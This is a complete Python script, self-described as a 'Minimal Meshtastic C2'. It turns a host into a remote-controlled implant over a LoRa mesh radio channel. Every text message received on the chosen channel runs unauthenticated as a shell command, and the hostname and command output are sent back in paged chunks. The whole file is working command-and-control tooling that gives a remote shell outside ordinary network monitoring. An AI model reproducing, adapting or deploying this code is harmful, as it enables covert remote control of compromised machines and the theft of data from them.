#!/usr/bin/env python3
import argparse
import os
import socket
import subprocess
import threading
import time
from collections import deque
from typing import Deque, Dict, Optional, Tuple

import meshtastic.serial_interface
from pubsub import pub

MAX_MESSAGE_LEN = 230
ACK_TEMPLATE = "MSG-ID:{cmd_id}\nHost:{host}\nCmd received: {command}"
OUTPUT_PREFIX = "MSG-ID:{cmd_id}\nOutput:\n"
OUTPUT_SUFFIX = "\n... (reply 'more {cmd_id}')"


class OutputBuffer:
    def __init__(self) -> None:
        self._lock = threading.Lock()
        self._buffers: Dict[str, Deque[str]] = {}

    def store(self, cmd_id: str, chunks: Deque[str]) -> None:
        with self._lock:
            self._buffers[cmd_id] = chunks

    def pop_next(self, cmd_id: str) -> Optional[str]:
        with self._lock:
            chunks = self._buffers.get(cmd_id)
            if not chunks:
                return None
            next_chunk = chunks.popleft()
            if not chunks:
                self._buffers.pop(cmd_id, None)
            return next_chunk


class MiniC2:
    def __init__(self, port: str, channel_index: int, timeout: int) -> None:
        self.port = port
        self.channel_index = channel_index
        self.timeout = timeout
        self.host = socket.gethostname()
        self.interface = meshtastic.serial_interface.SerialInterface(self.port)
        self.output_buffer = OutputBuffer()
        self._command_lock = threading.Lock()

        pub.subscribe(self._on_receive, "meshtastic.receive")

    def _send_text(self, text: str) -> None:
        self.interface.sendText(text, channelIndex=self.channel_index)

    def _on_receive(self, packet, interface) -> None:
        decoded = packet.get("decoded", {})
        if decoded.get("portnum") != "TEXT_MESSAGE_APP":
            return

        text = decoded.get("text")
        if not text and "payload" in decoded:
            text = decoded["payload"].decode("utf-8", errors="ignore")

        if not text:
            return

        text = text.strip()
        if not text:
            return

        if text.startswith("MSG-ID:") or text.startswith("Output:"):
            return

        if text.startswith("Cmd received:"):
            return

        if text.startswith("more "):
            cmd_id = text.split(" ", 1)[1].strip()
            self._handle_more(cmd_id)
            return

        threading.Thread(target=self._execute_and_respond, args=(text,), daemon=True).start()

    def _handle_more(self, cmd_id: str) -> None:
        chunk = self.output_buffer.pop_next(cmd_id)
        if not chunk:
            self._send_text(f"MSG-ID:{cmd_id}\nNo more output")
            return
        self._send_text(chunk)

    def _execute_and_respond(self, command: str) -> None:
        with self._command_lock:
            cmd_id = str(int(time.time() * 1000))
            ack = ACK_TEMPLATE.format(cmd_id=cmd_id, host=self.host, command=command)
            self._send_text(ack)

            result = self._run_command(command)
            chunks = self._format_output(cmd_id, result)

            if not chunks:
                self._send_text(f"MSG-ID:{cmd_id}\nOutput:\n<no output>")
                return

            first_chunk = chunks.popleft()
            self._send_text(first_chunk)
            if chunks:
                self.output_buffer.store(cmd_id, chunks)

    def _run_command(self, command: str) -> Tuple[str, str, int]:
        process = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )
        try:
            stdout, stderr = process.communicate(timeout=self.timeout)
        except subprocess.TimeoutExpired:
            process.kill()
            stdout, stderr = process.communicate()
            stderr = (stderr or "") + f"\nCommand timed out after {self.timeout}s"
        return stdout or "", stderr or "", process.returncode

    def _format_output(self, cmd_id: str, result: Tuple[str, str, int]) -> Deque[str]:
        stdout, stderr, exit_code = result
        combined = stdout
        if stderr:
            combined = combined + ("\n" if combined else "") + stderr
        combined = combined.strip()
        if not combined:
            combined = "<no output>"

        prefix = OUTPUT_PREFIX.format(cmd_id=cmd_id)
        suffix = OUTPUT_SUFFIX.format(cmd_id=cmd_id)
        max_payload = MAX_MESSAGE_LEN

        first_limit = max_payload - len(prefix) - len(suffix)
        if first_limit <= 0:
            return deque([f"MSG-ID:{cmd_id}\nOutput too long"])

        chunks = deque()
        remaining = combined
        first = True
        while remaining:
            if first:
                chunk_body = remaining[:first_limit]
                remaining = remaining[first_limit:]
                chunk = prefix + chunk_body + (suffix if remaining else "")
                chunks.append(chunk)
                first = False
            else:
                next_limit = max_payload
                chunk_body = remaining[:next_limit]
                remaining = remaining[next_limit:]
                chunk = f"MSG-ID:{cmd_id}\n{chunk_body}"
                chunks.append(chunk)

        return chunks

    def run(self) -> None:
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            pass


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Minimal Meshtastic C2")
    parser.add_argument("--port", default=os.getenv("MINIC2_PORT", "/dev/ttyACM0"))
    parser.add_argument("--channel-index", type=int, default=int(os.getenv("MINIC2_CHANNEL", "1")))
    parser.add_argument("--timeout", type=int, default=int(os.getenv("MINIC2_TIMEOUT", "20")))
    return parser.parse_args()


def main() -> None:
    args = parse_args()
    c2 = MiniC2(args.port, args.channel_index, args.timeout)
    print(f"MiniC2 running on {args.port} channel {args.channel_index}")
    c2.run()


if __name__ == "__main__":
    main()
